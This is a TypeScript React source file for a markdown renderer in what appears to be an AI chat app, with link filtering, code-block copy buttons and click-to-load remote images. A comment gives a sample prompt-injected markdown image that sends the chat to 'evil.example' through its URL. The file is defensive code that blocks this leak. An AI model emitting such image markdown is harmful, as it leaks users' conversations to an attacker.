import { memo, useEffect, useRef, useState, type ReactNode } from 'react';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { Check, Copy, ImageIcon } from 'lucide-react';
import { isAllowedExternalUrl } from '@shared/app';
import { gmi } from '@renderer/lib/gmi';
import { cn } from '@renderer/lib/cn';
import { microLabel } from './ui/misc';
import { pressMotion } from './ui/motion';

function hostOf(url: string): string {
  try {
    return new URL(url).host;
  } catch {
    return url;
  }
}

/** Copies `text`; `copied` stays true for 1.5 s afterwards (for a check mark). Shared with the chat page. */
export function useCopy(text: string) {
  const [copied, setCopied] = useState(false);
  const timer = useRef<ReturnType<typeof setTimeout> | null>(null);
  useEffect(
    () => () => {
      if (timer.current) clearTimeout(timer.current);
    },
    [],
  );
  const copy = () => {
    void navigator.clipboard
      .writeText(text)
      .then(() => {
        setCopied(true);
        if (timer.current) clearTimeout(timer.current);
        timer.current = setTimeout(() => setCopied(false), 1500);
      })
      .catch(() => undefined);
  };
  return { copied, copy };
}

/**
 * A remote image as model or feed text asked for it. Nothing is requested until the user clicks: an image
 * URL can carry data out (a prompt-injected `![](https://evil.example/p.png?d=<chat>)` would otherwise leak
 * the conversation the moment it streams in). Once loaded, no Referer is sent.
 */
export function RemoteImageView({ src, alt, loaded, onLoad }: { src: string; alt: string; loaded: boolean; onLoad: () => void }) {
  if (loaded) {
    return <img src={src} alt={alt} referrerPolicy="no-referrer" loading="lazy" decoding="async" className="max-h-96 rounded-md border border-border" />;
  }
  const host = hostOf(src);
  return (
    <button
      type="button"
      onClick={onLoad}
      title={src}
      className={cn(
        'inline-flex max-w-full items-center gap-1.5 rounded-md border border-dashed border-border px-2 py-1 align-middle text-xs text-muted-foreground hover:border-input hover:bg-accent hover:text-foreground',
        pressMotion,
      )}
    >
      <ImageIcon className="size-3.5 shrink-0" />
      <span className="min-w-0 truncate">
        {alt ? <span className="text-foreground">{alt}</span> : 'Image'} from <span className="font-medium text-foreground">{host}</span>
      </span>
      <span className="shrink-0 text-muted-foreground/80">· click to load</span>
    </button>
  );
}

function RemoteImage({ src, alt }: { src: string; alt: string }) {
  // Keyed by URL: a different src in the same position (streaming, edits) needs its own click.
  const [loadedSrc, setLoadedSrc] = useState<string | null>(null);
  return <RemoteImageView src={src} alt={alt} loaded={loadedSrc === src} onLoad={() => setLoadedSrc(src)} />;
}

/** Minimal hast shape (react-markdown passes the parsed node to component overrides). */
interface HastNode {
  type: string;
  value?: string;
  tagName?: string;
  properties?: Record<string, unknown>;
  children?: HastNode[];
}

function textOf(node: HastNode): string {
  if (node.type === 'text') return node.value ?? '';
  return node.children ? node.children.map(textOf).join('') : '';
}

/** "language-sql" on the inner <code> → "sql". */
function languageOf(pre: HastNode | undefined): string | null {
  const code = pre?.children?.find((child) => child.type === 'element' && child.tagName === 'code');
  const classes = code?.properties?.className;
  const list = Array.isArray(classes) ? classes.map(String) : typeof classes === 'string' ? classes.split(/\s+/) : [];
  const lang = list.find((c) => c.startsWith('language-'))?.slice('language-'.length);
  return lang ? lang.slice(0, 24) : null;
}

/** Fenced code: a quiet header (language micro-label + copy) over the scrolling block. */
function CodeBlock({ language, text, children }: { language: string | null; text: string; children: ReactNode }) {
  const { copied, copy } = useCopy(text.replace(/\n$/, ''));
  return (
    <div className="overflow-hidden rounded-lg border border-border bg-card">
      <div className="flex h-8 items-center justify-between gap-2 border-b border-border pl-3 pr-1">
        <span className={cn('min-w-0 truncate text-muted-foreground', microLabel)}>{language ?? 'code'}</span>
        <button
          type="button"
          onClick={copy}
          aria-label={copied ? 'Copied' : 'Copy code'}
          className={cn(
            'flex h-6 shrink-0 items-center gap-1.5 rounded px-1.5 text-muted-foreground hover:bg-accent hover:text-foreground [&_svg]:size-3',
            microLabel,
            pressMotion,
          )}
        >
          {copied ? <Check className="text-primary-ink" /> : <Copy />}
          <span aria-hidden>{copied ? 'Copied' : 'Copy'}</span>
        </button>
      </div>
      {/* The frame above carries the border, radius and surface; .gmi-markdown pre keeps font, padding, scroll.
          The ! is needed: .gmi-markdown is unlayered CSS and beats plain utilities. */}
      <pre className="rounded-none! border-0! bg-transparent!">{children}</pre>
    </div>
  );
}

const components: Components = {
  a({ href, children, node: _node, ...props }) {
    const safe = typeof href === 'string' && isAllowedExternalUrl(href);
    return (
      <a
        {...props}
        href={safe ? href : undefined}
        title={safe ? href : undefined}
        onClick={(event) => {
          event.preventDefault();
          if (safe && href) void gmi.app.openExternal(href).catch(() => undefined);
        }}
      >
        {children}
      </a>
    );
  },
  img({ src, alt }) {
    // Remote https images only, and only after a click; never local files or other schemes.
    if (typeof src !== 'string' || !isAllowedExternalUrl(src)) return <span>{alt}</span>;
    return <RemoteImage src={src} alt={alt ?? ''} />;
  },
  // Tables: a thin rounded frame that scrolls sideways; .gmi-markdown styles the cells (muted header, hairlines
  // between rows, no grid).
  table({ node: _node, children, ...props }) {
    return (
      <div className="w-fit max-w-full overflow-x-auto rounded-lg border border-border">
        <table {...props}>{children}</table>
      </div>
    );
  },
  pre({ node, children }) {
    const hast = node as HastNode | undefined;
    return (
      <CodeBlock language={languageOf(hast)} text={hast ? textOf(hast) : ''}>
        {children}
      </CodeBlock>
    );
  },
};

/** GitHub-flavoured Markdown for model output and descriptions. Raw HTML is never rendered; images load on click. */
export const Markdown = memo(function Markdown({ children, className }: { children: string; className?: string }) {
  return (
    <div className={cn('gmi-markdown text-[14px]', className)}>
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components} skipHtml>
        {children}
      </ReactMarkdown>
    </div>
  );
});
